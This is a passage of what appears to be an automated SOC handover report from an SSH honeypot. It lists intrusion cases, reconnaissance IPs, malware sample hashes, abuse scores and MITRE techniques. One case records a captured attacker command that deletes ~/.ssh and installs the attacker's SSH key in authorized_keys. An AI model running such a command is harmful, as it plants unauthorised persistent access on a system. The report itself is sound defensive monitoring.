- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96ba0917791e

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 20:26 |
| **Last Seen** | 2026-04-07 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:26:46` | `cowrie.session.connect` |
| `2026-04-07 20:26:46` | `cowrie.client.version` |
| `2026-04-07 20:26:47` | `cowrie.client.kex` |
| `2026-04-07 20:26:48` | `cowrie.login.success` |
| `2026-04-07 20:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc8e4b0a205

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:26 |
| **Last Seen** | 2026-04-07 20:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:26:50` | `cowrie.session.connect` |
| `2026-04-07 20:26:50` | `cowrie.client.version` |
| `2026-04-07 20:26:50` | `cowrie.client.kex` |
| `2026-04-07 20:26:50` | `cowrie.login.success` |
| `2026-04-07 20:26:51` | `cowrie.session.params` |
| `2026-04-07 20:26:51` | `cowrie.command.input` |
| `2026-04-07 20:26:51` | `cowrie.command.failed` |
| `2026-04-07 20:26:51` | `cowrie.log.closed` |
| `2026-04-07 20:26:51` | `cowrie.session.params` |
| `2026-04-07 20:26:51` | `cowrie.command.input` |
| `2026-04-07 20:26:51` | `cowrie.session.file_download` |
| `2026-04-07 20:26:51` | `cowrie.log.closed` |
| `2026-04-07 20:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5782f3f665b0

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:26 |
| **Last Seen** | 2026-04-07 20:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:26:53` | `cowrie.session.connect` |
| `2026-04-07 20:26:53` | `cowrie.client.version` |
| `2026-04-07 20:26:53` | `cowrie.client.kex` |
| `2026-04-07 20:26:53` | `cowrie.login.success` |
| `2026-04-07 20:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `2.27.63[.]102` | **13** | 2026-04-07 19:28 | 2026-04-07 20:21 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `202.165.29[.]174` | **13** | 2026-04-07 20:20 | 2026-04-07 20:42 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.124.174[.]226` | **2** | 2026-04-07 19:36 | 2026-04-07 19:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.29[.]184` | 1 | 2026-04-07 19:27 | 2026-04-07 19:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.196.66[.]80` | 1 | 2026-04-07 20:21 | 2026-04-07 20:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.48.206[.]71` | 1 | 2026-04-07 20:10 | 2026-04-07 20:11 | 14s | 0 | `T1592` | 🟢 LOW |
| `180.108.64[.]6` | 1 | 2026-04-07 20:19 | 2026-04-07 20:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]16` | 1 | 2026-04-07 20:17 | 2026-04-07 20:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.137[.]24` | 1 | 2026-04-07 19:28 | 2026-04-07 19:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.96[.]235` | 1 | 2026-04-07 20:17 | 2026-04-07 20:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.232.42[.]214` | 1 | 2026-04-07 19:45 | 2026-04-07 19:46 | 31s | 0 | `T1592` | 🟢 LOW |
| `70.54.182[.]130` | 1 | 2026-04-07 19:29 | 2026-04-07 19:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `151.48.206[.]71` | IT | WIND Telecomunicazioni S.p.A | **100** ⚠️ | 2 |
| `202.165.29[.]174` | MY | TM TECHNOLOGY SERVICES SDN. BHD. | **100** ⚠️ | 5 |
| `180.76.105[.]16` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.76.137[.]24` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 16 |
| `40.124.174[.]226` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `2.27.63[.]102` | DE | Kyonix Hosting - kyonix.com | **100** ⚠️ | 11 |
| `180.76.96[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 42 |
| `49.232.42[.]214` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 41 |
| `120.196.66[.]80` | CN | China Mobile Communications Corporation | **100** ⚠️ | 20 |
| `106.12.29[.]184` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 47 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 57 cases |
| Tool 34  | Credential Extractor        | ✅ 45 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 14 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (3.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 12 recon entry/entries in table (3 group(s) consolidating 28 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-07T20:44:26Z_
